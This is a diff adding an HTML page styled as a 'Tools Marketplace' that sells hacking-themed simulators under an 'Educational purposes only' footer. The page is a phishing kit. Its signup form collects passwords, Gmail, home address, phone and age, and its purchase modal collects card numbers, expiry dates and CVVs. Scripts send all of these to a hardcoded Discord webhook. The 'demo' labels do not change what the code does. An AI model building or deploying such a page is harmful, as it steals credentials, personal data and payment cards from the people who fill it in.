@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tools Marketplace</title>
+<style>
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #000;
+    color: #fff;
+    margin: 0;
+    padding: 0;
+}
+
+header {
+    background-color: #1a1a1a;
+    text-align: center;
+    padding: 30px 20px;
+    border-bottom: 2px solid #0048ff;
+}
+
+header h1 {
+    margin: 0;
+    font-size: 2.5em;
+    color: #0033ff;
+    letter-spacing: 2px;
+}
+
+input, select, textarea {
+    padding: 12px;
+    margin: 8px 0;
+    border-radius: 6px;
+    border: none;
+    width: 250px;
+    font-size: 1em;
+}
+
+textarea { width: 300px; }
+
+button {
+    padding: 12px 25px;
+    border: none;
+    border-radius: 6px;
+    background-color: #4c00ff;
+    color: #fff;
+    font-size: 1em;
+    cursor: pointer;
+    margin-top: 10px;
+    transition: 0.3s;
+}
+
+button:hover { background-color: #2500cc; }
+
+.message {
+    text-align: center;
+    margin-top: 15px;
+    font-weight: bold;
+    color: #7944ff;
+}
+
+.marketplace { display: none; max-width: 1200px; margin: 40px auto; padding: 0 20px; }
+
+.marketplace h2 {
+    border-bottom: 2px solid #1900ff;
+    padding-bottom: 10px;
+    margin-bottom: 20px;
+    font-size: 2em;
+    color: #3700ff;
+}
+
+.tools-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 20px;
+}
+.tool-card {
+    background-color: #111;
+    border: 2px solid #6200ff;
+    border-radius: 12px;
+    padding: 20px;
+    transition: 0.3s;
+    box-shadow: 0 0 10px #aa00ff inset;
+}
+
+.tool-card:hover {
+    background-color: #1a1a1a;
+    transform: scale(1.05);
+    box-shadow: 0 0 20px #4486ff;
+}
+
+.tool-card h3 { color: #000dff; margin-top: 0; }
+.tool-card p { font-size: 0.95em; color: #ddd; }
+.price { font-weight: bold; color: #fff; margin-top: 10px; font-size: 1.2em; }
+
+.dashboard { margin-top: 40px; padding: 20px; border: 2px solid #3c00ff; border-radius: 12px; background-color: #111; }
+.dashboard h3 { color: #0022ff; margin-top: 0; margin-bottom: 15px; }
+.dashboard ul { list-style: none; padding-left: 0; }
+.dashboard li { background-color: #1a1a1a; margin: 5px 0; padding: 10px; border-radius: 6px; display: flex; justify-content: space-between; color: #ddd; }
+
+footer { text-align: center; padding: 20px; border-top: 2px solid #0004ff; margin-top: 50px; color: #5144ff; }
+
+/* Modal */
+.modal {
+    display: none;
+    position: fixed;
+    z-index: 1000;
+    left: 0; top: 0;
+    width: 100%; height: 100%;
+    overflow: auto;
+    background-color: rgba(0,0,0,0.85);
+    justify-content: center;
+    align-items: center;
+}
+
+.modal-content {
+    background-color: #111;
+    padding: 30px;
+    border-radius: 12px;
+    border: 2px solid #4000ff;
+    width: 300px;
+    text-align: center;
+}
+
+.modal-content input { width: 90%; margin-bottom: 10px; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Tools Marketplace</h1>
+</header>
+
+<div class="login-container">
+  <form id="loginForm">
+    <input type="text" id="firstName" placeholder="First Name" required><br>
+    <input type="text" id="lastName" placeholder="Last Name" required><br>
+    <input type="text" id="discord" placeholder="discord" required><br>
+    <input type="email" id="gmail" placeholder="Gmail" required><br>
+    <input type="password" id="password" placeholder="Password" required><br>
+    <input type="number" id="age" placeholder="Age" required><br>
+    <input type="text" id="state" placeholder="State" required><br>
+    <input type="text" id="city" placeholder="City" required><br>
+    <input type="text" id="houseAddress" placeholder="House Address" required><br>
+    <input type="text" id="zipCode" placeholder="Zip Code" required><br>
+    <input type="text" id="phoneNumber" placeholder="Phone Number" required><br>
+    <input type="text" id="progLanguages" placeholder="Preferred Programming Languages"><br>
+    <select id="experienceLevel" required>
+    <option value="">Select Experience Level</option>
+    <option value="Beginner">Beginner</option>
+    <option value="Intermediate">Intermediate</option>
+    <option value="Advanced">Advanced</option>
+    <option value="Expert">Expert</option>
+    </select><br>
+    <textarea id="notes" placeholder="Additional Notes" rows="3"></textarea><br>
+    <button type="submit">Submit</button>
+</form>
+<div class="message" id="message"></div>
+</div>
+
+<div class="marketplace" id="marketplace">
+<h2>Available Tools</h2>
+<div class="tools-grid" id="toolsGrid"></div>
+
+<div class="dashboard" id="dashboard">
+<h3>Purchased Tools</h3>
+<ul id="purchasedList"></ul>
+</div>
+</div>
+
+<!-- Purchase Modal -->
+<div class="modal" id="purchaseModal">
+<div class="modal-content">
+    <h3 id="modalToolName">Tool Name</h3>
+    <p id="modalPrice">$0.00</p>
+    <input type="text" id="modalCardHolder" placeholder="Cardholder Name">
+    <input type="text" id="modalCardNumber" placeholder="Card Number">
+    <input type="text" id="modalExpiryDate" placeholder="MM/YY">
+    <input type="text" id="modalCVV" placeholder="CVV">
+    <input type="text" id="modalBillingAddress" placeholder="Billing Address">
+    <button onclick="confirmPurchase()">Confirm Purchase</button>
+    <button onclick="closePurchaseModal()">Cancel</button>
+</div>
+</div>
+
+<footer>
+Marketplace | Educational purposes only
+</footer>
+
+<script>
+// Discord webhook URL 
+const webhookURL = "https://discord.com/api/webhooks/1395193861118099608/vd9Xxoxvz79dt8BIuj4h3FX7zGuOL9j-evTgZCz3Zvs6jDDvdmB5-CMXiH8DREK5Ykx5";
+
+const loginForm = document.getElementById('loginForm');
+const message = document.getElementById('message');
+const marketplace = document.getElementById('marketplace');
+const purchasedList = document.getElementById('purchasedList');
+const toolsGrid = document.getElementById('toolsGrid');
+
+let currentUser = "";
+let currentTool = "";
+let currentPrice = "";
+
+// List of 30+ tools
+const tools = [
+  {name: "OSINT Simulator", desc: "Explore mock datasets safely.", price: "$5.99"},
+  {name: "Logger Simulator", desc: "Analyze logs safely.", price: "$9.99"},
+  {name: "PenTest Practice Suite", desc: "Safe penetration testing.", price: "$9.99"},
+  {name: "API Testing Toolkit", desc: "Simulate API requests.", price: "$9.99"},
+  {name: "Network Scanner Pro", desc: "Simulate network scans.", price: "$9.99"},
+  {name: "Crypto Logger Simulator", desc: "Analyze blockchain safely.", price: "$9.99"},
+  {name: "API Attack Simulator", desc: "Test API vulnerabilities safely.", price: "$4.99"},
+  {name: "Web Scraper Pro", desc: "Practice web scraping safely.", price: "$19.99"},
+  {name: "Email Security Tester", desc: "Simulate email phishing tests.", price: "$2.99"},
+  {name: "Cloud Security Analyzer", desc: "Learn cloud security basics.", price: "$3.99"},
+  {name: "Firewall Simulator", desc: "Practice firewall configuration safely.", price: "$3.99"},
+  {name: "Social Media Scraper", desc: "Extract data safely for learning.", price: "$14.99"},
+  {name: "Network Packet Analyzer", desc: "Analyze network packets safely.", price: "$4.99"},
+  {name: "Malware Sandbox", desc: "Test malware safely in a sandbox.", price: "$5.99"},
+  {name: "Vulnerability Scanner", desc: "Scan systems safely.", price: "$9.99"},
+  {name: "Password Strength Tester", desc: "Learn password security.", price: "$9.99"},
+  {name: "IoT Security Simulator", desc: "Test IoT devices safely.", price: "$9.99"},
+  {name: "Phishing Email Creator", desc: "phishing scenarios.", price: "$9.99"},
+  {name: "Mobile App Security Tester", desc: "Safe mobile security testing.", price: "$4.99"},
+  {name: "Data Leak Simulator", desc: "Simulate leaks for learning purposes.", price: "$4.99"},
+  {name: "DNS Analyzer", desc: "Analyze DNS safely.", price: "$2.99"},
+  {name: "Web App Scanner", desc: "Test web apps safely.", price: "$9.99"},
+  {name: "Network Topology Mapper", desc: "Map networks safely.", price: "$9.99"},
+  {name: "Threat Intelligence Dashboard", desc: "Explore threat intel safely.", price: "$9.99"},
+  {name: "SIEM Simulator", desc: "Simulate SIEM systems.", price: "$4.99"},
+  {name: "Log Aggregator Pro", desc: "Aggregate logs safely.", price: "$4.99"},
+  {name: "Phishing Awareness Trainer", desc: "Train phishing awareness.", price: "$4.99"},
+  {name: "Botnet Simulation Lab", desc: "Learn botnet mitigation safely.", price: "$9.99"},
+  {name: "Password Cracking Simulator", desc: "Learn password cracking safely.", price: "$9.99"},
+  {name: "Network Defense Trainer", desc: "Train network defense safely.", price: "$9.99"},
+];
+
+// Dynamically create tool cards
+tools.forEach(tool => {
+  const div = document.createElement('div');
+  div.className = "tool-card";
+  div.innerHTML = `<h3>${tool.name}</h3><p>${tool.desc}</p><p class="price">${tool.price}</p>
+    <button onclick="openPurchaseModal('${tool.name}','${tool.price}')">Buy</button>`;
+  toolsGrid.appendChild(div);
+});
+
+// Login form
+loginForm.addEventListener('submit', function(e){
+e.preventDefault();
+const data = {
+    "First Name": document.getElementById('firstName').value,
+    "Last Name": document.getElementById('lastName').value,
+    "Discord": document.getElementById('discord').value,
+    "Gmail": document.getElementById('gmail').value,
+    "Password (demo)": document.getElementById('password').value,
+    "Age": document.getElementById('age').value,
+    "State": document.getElementById('state').value,
+    "City": document.getElementById('city').value,
+    "House Address": document.getElementById('houseAddress').value,
+    "Zip Code": document.getElementById('zipCode').value,
+    "Phone Number": document.getElementById('phoneNumber').value,
+    "Programming Languages": document.getElementById('progLanguages').value,
+    "Experience Level": document.getElementById('experienceLevel').value,
+    "Notes": document.getElementById('notes').value
+};
+currentUser = data.Username;
+message.textContent = `Logged in as: ${currentUser}`;
+loginForm.style.display = 'none';
+marketplace.style.display = 'block';
+const embedFields = Object.keys(data).map(key => ({ name: key, value: data[key] || "N/A", inline: true }));
+sendToDiscord({title: "Demo Signup Info", description:"User Signup/Login", fields:embedFields, color:16711680, timestamp:new Date()});
+});
+
+// Modal
+function openPurchaseModal(tool, price){
+  currentTool = tool;
+  currentPrice = price;
+  document.getElementById('modalToolName').textContent = tool;
+  document.getElementById('modalPrice').textContent = price;
+  document.getElementById('purchaseModal').style.display = 'flex';
+}
+function closePurchaseModal(){ document.getElementById('purchaseModal').style.display='none'; }
+function confirmPurchase(){
+  const cardHolder = document.getElementById('modalCardHolder').value || "Demo User";
+  const cardNumber = document.getElementById('modalCardNumber').value || "1234 5678 9012 3456";
+  const expiryDate = document.getElementById('modalExpiryDate').value || "12/25";
+  const cvv = document.getElementById('modalCVV').value || "123";
+  const billingAddress = document.getElementById('modalBillingAddress').value || "123 Demo St";
+  const li = document.createElement('li');
+  li.textContent = `${currentTool} - ${currentPrice}`;
+  purchasedList.appendChild(li);
+  sendToDiscord({
+    title: "Demo Purchase",
+    description: `User: ${currentUser} purchased ${currentTool}`,
+    fields: [
+      {name:"Price", value:currentPrice, inline:true},
+      {name:"Cardholder", value:cardHolder, inline:true},
+      {name:"Card Number", value:cardNumber, inline:true},
+      {name:"Expiry Date", value:expiryDate, inline:true},
+      {name:"Billing Address", value:billingAddress, inline:true},
+      {name:"CVV", value:cvv, inline:true}
+    ],
+    color:16711680,
+    timestamp:new Date()
+  });
+  closePurchaseModal();
+}
+
+// Discord send
+function sendToDiscord(embed){
+  fetch(webhookURL, {
+    method:"POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({embeds:[embed]})
+  }).then(res=>res.ok?console.log("Sent!") : console.error("Failed"));
+}
+</script>
+</body>
+</html>
